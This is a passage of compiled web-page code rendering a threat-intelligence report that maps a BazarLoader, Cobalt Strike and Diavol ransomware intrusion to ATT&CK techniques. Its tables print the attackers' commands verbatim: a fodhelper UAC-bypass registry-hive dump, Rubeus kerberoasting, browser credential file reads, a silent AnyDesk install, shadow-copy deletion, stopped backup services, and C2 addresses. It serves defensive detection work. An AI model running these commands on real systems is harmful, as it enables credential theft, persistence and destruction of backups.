",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Temp1_new-documents-2005.zip\\\\new-documents-2005.iso")),(0,l.kt)("td",{parentName:"tr",align:null},"- ISO file contained in the zip file",(0,l.kt)("br",null),"- ISO file created on temp folder. Indicates that the user opened the zip file with Explorer.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002",(0,l.kt)("br",null),"T1553.005"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},".LNK")," files in ",(0,l.kt)("em",{parentName:"td"},".ISO")," files to lure users for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\rundll32.exe SharedFiles.dll, BasicScore")),(0,l.kt)("td",{parentName:"tr",align:null},"- SharedFiles.dll is included in the ISO file")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"RUNDLL32")," to execute ",(0,l.kt)("em",{parentName:"td"},".DLL")," payloads for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\rundll32.exe SharedFiles.dll, BasicScore")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1197",(0,l.kt)("br",null),"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"BazarLoader used ",(0,l.kt)("em",{parentName:"td"},"BITSadmin")," command-line callbacks for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\svchost.exe -k netsvcs -p -s BITS"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rundll32.exe \\"D:\\\\SharedFiles.dll\\", BasicScore')),(0,l.kt)("td",{parentName:"tr",align:null},"- the BITS job is designed to fail; attempts to download an unexisting file.",(0,l.kt)("br",null),'- the "bitsadmin /setnotifycmdline" option is used to specify a callback commandline',(0,l.kt)("br",null),'- Name of the BITS job is "Microsoft Office Manager upgrade v24.24"')),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1069.001",(0,l.kt)("br",null),"T1069.002",(0,l.kt)("br",null),"T1482",(0,l.kt)("br",null),"T1018",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"BazarLoader used a well known set of ",(0,l.kt)("em",{parentName:"td"},"net.exe")," and ",(0,l.kt)("em",{parentName:"td"},"nltest.exe")," commands for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net group /domain admins"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Domain Computers\\" /domain'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net localgroup administrator"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net view /all"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"nltest /domain_trusts /alltrusts")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1218.011",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"BazarLoader used HTTP protocol to download ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," Beacon DLL files for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"23.81.246[.]32"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"gawocag[.]com"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\tfpkuengdlu.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\temp.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\uvvfvnnswte.dll")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1055",(0,l.kt)("br",null),"T1018",(0,l.kt)("br",null),"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used process injection into ",(0,l.kt)("em",{parentName:"td"},"Edge browser")," to launch ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," post-exploitation tasks for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net view /all"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rundll32.exe \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Bfzefze\\\\tfpkuengdlu\\" EnterDll')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1018",(0,l.kt)("br",null),"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to execute ",(0,l.kt)("em",{parentName:"td"},"ipconfig")," and ",(0,l.kt)("em",{parentName:"td"},"net user")," commands for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"ipconfig /all"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net user USER /domain")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011",(0,l.kt)("br",null),"T1059.003",(0,l.kt)("br",null),"T1016",(0,l.kt)("br",null),"T1482",(0,l.kt)("br",null),"T1036"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to execute a well-known ",(0,l.kt)("em",{parentName:"td"},"AdFind")," recon script for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /C adf.bat"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'qq.exe -f \\"(objectcategory=person)\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'qq.exe -f \\"objectcategory=computer\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'qq.exe -f \\"(objectcategory=organizationalUnit)\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"qq.exe -sc trustdmp"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"qq.exe -subnets -f (objectCategory=subnet)"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'qq.exe -f \\"(objectcategory=group)\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"qq.exe -gcb -sc trustdmp")),(0,l.kt)("td",{parentName:"tr",align:null},"- Well known script, ",(0,l.kt)("em",{parentName:"td"},"adf.bat"),(0,l.kt)("br",null),"- Well known recon script adf.bat",(0,l.kt)("br",null),"- AdFind renamed to qq")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1003.002",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used a ",(0,l.kt)("em",{parentName:"td"},"CMD")," batch script to dump SAM, SECURITY and SYSTEM registry hives via Reg.exe for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\sam c:\\\\ProgramData\\\\sam.save\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\security c:\\\\ProgramData\\\\security.save\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\system c:\\\\ProgramData\\\\system.save\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"reg.exe delete hkcu\\\\software\\\\classes\\\\ms-settings /f >nul 2>&1")),(0,l.kt)("td",{parentName:"tr",align:null},"- (using a batch script named fodhelper_reg_hashes.bat)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MORE.COM")," command-line tool to access Web Browser internal files for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"more C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"more C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Cookies"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"more C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\edge-cookies.json")),(0,l.kt)("td",{parentName:"tr",align:null},"- More.com, a.k.k. More Utility file, is part of Microsoft Windows.",(0,l.kt)("br",null),"- More.com allows to read text files.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1558.003",(0,l.kt)("br",null),"T1558.004",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Rubeus.exe")," for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\cmd.exe /C Rubeus.exe kerberoast /ldapfilter:\\'admincount=1\\' /format:hashcat /outfile:C:\\\\ProgramData\\\\hashes.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\cmd.exe /C Rubeus.exe asreproast /format:hashcat /outfile:C:\\\\ProgramData\\\\asrephashes.txt")),(0,l.kt)("td",{parentName:"tr",align:null},"- Rubeus is a C# toolset for raw Kerberos interaction and abuse.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1016"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used multiple system utilities for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group "Domain Admins" /domain'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"ipconfig /all"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"systeminfo"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"tasklist"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Enterprise admins\\" /domain'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami /all"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net use"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"query user")),(0,l.kt)("td",{parentName:"tr",align:null},"- multiple commands")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1219",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"td"},"CMD")," to install ",(0,l.kt)("em",{parentName:"td"},"AnyDesk")," for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"download.anydesk.com"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\AnyDesk.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent"),(0,l.kt)("br",null),"- `cmd.exe /c echo J9kzQ2Y0qO"),(0,l.kt)("td",{parentName:"tr",align:null},"C:\\ProgramData\\anydesk.exe --set-password",(0,l.kt)("inlineCode",{parentName:"td"},"<br/>- "),"cmd.exe /c C:\\ProgramData\\AnyDesk.exe --get-id`")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"T1048",(0,l.kt)("br",null),"T1021.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to install ",(0,l.kt)("em",{parentName:"td"},"FileZilla")," for Exfiltration."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"FileZillaPortable.exe.")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001",(0,l.kt)("br",null),"T1003.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Task Manager")," to dump LSASS process memory for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\system32\\taskmgr.exe" /7'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\lsass.DMP"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\lsass (2).DMP")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"T1567.002"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Web browser")," to upload LSASS dump file to Cloud Storage for Exfiltration."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"ufile.io")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001",(0,l.kt)("br",null),"T1105",(0,l.kt)("br",null),"T1046"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to download and execute portable version of ",(0,l.kt)("em",{parentName:"td"},"Advanced_IP_Scanner")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"51.89.153.153"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"download.advanced-ip-scanner[.]com"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\\\Downloads\\\\Advanced_IP_Scanner_2.5.3850.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d")),(0,l.kt)("td",{parentName:"tr",align:null},"- Advanced_IP_Scanner is a network scanner.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1046"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSSQLUDPScanner.exe")," MSSQL tool for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"MSSQLUDPScanner.exe --cdir #{range}")),(0,l.kt)("td",{parentName:"tr",align:null},"- MSSQLUDPScanner.exe is an offensive tool",(0,l.kt)("br",null),"- Likely https://github","[.]","com/rvrsh3ll/MSSQLUDPScanner",(0,l.kt)("br",null),"- Likely executed via Cobalt Strike")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1490"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used well known batch file -",(0,l.kt)("em",{parentName:"td"},"kill.bat"),"- to inhibit system recovery for Impact."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'sc  config \\"Netbackup Legacy Network service\\" start= disabled'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"bcdedit  /set {default}"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"bcdedit  /set {default} recoveryenabled No"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"vssadmin.exe  Delete Shadows /all /quiet"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic.exe  Shadowcopy Delete"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"Zoolz 2 Service\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"Veeam Backup Catalog Data Service\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"Symantec System Recovery\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"SQLsafe Filter Service\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"SQLsafe Backup Service\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"SQL Backups\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"Acronis VSS Provider\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop VeeamDeploySvc /y"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop BackupExecVSSProvider /y"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop BackupExecRPCService /y"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop BackupExecManagementService /y"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop BackupExecJobEngine /y"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop BackupExecDeviceMediaService /y")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1486",(0,l.kt)("br",null),"T1491.001",(0,l.kt)("br",null),"T1021.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to execute Diavol Ransomware binary manually on targets for Impact."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\CryptoLocker64.exe.")),(0,l.kt)("td",{parentName:"tr",align:null})))),(0,l.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,l.kt)("h3",{id:"threat-actor-used-emails-with-malicious-hyperlinks-to-onedrive-for-initial-access"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Emails")," with malicious hyperlinks to ",(0,l.kt)("em",{parentName:"h3"},"OneDrive")," for Initial Access."),(0,l.kt)("h4",{id:"tactic"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Initial Access")),(0,l.kt)("h4",{id:"techniques"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1566.002 - Phishing: Spearphishing Link"),(0,l.kt)("li",{parentName:"ul"},"T1204.001 - User Execution: Malicious Link"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1566.002"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Email")," with malicious hyperlink to ",(0,l.kt)("em",{parentName:"td"},"OneDrive"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Link"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"/onedrive.live[.]com/download?cid=0094E8452D7CDD65&resid=94E8452D7CDD65%21135&authkey=AEN3yDYOia1YdKM"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1204.001",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"msedge browser created BazarLoader zip file."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Downloads\\new-documents-2005.zip"))))),(0,l.kt)("h3",{id:"threat-actor-used-zipped-iso-files-to-distribute-bazarloader-malware-for-defense-evasion"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"zipped .ISO")," files to distribute BazarLoader malware for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-1"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-1"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass")),(0,l.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1553.005"),(0,l.kt)("td",{parentName:"tr",align:null},"Explorer.exe created ",(0,l.kt)("em",{parentName:"td"},"ISO")," file on Temp folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Temp1_new-documents-2005.zip\\\\new-documents-2005.iso"))))),(0,l.kt)("h4",{id:"notes"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"ISO file contained in the zip file"),(0,l.kt)("li",{parentName:"ul"},"ISO file created on temp folder. Indicates that the user opened the zip file with Explorer.")),(0,l.kt)("h3",{id:"threat-actor-used-lnk-files-in-iso-files-to-lure-users-for-execution"},"Threat Actor used 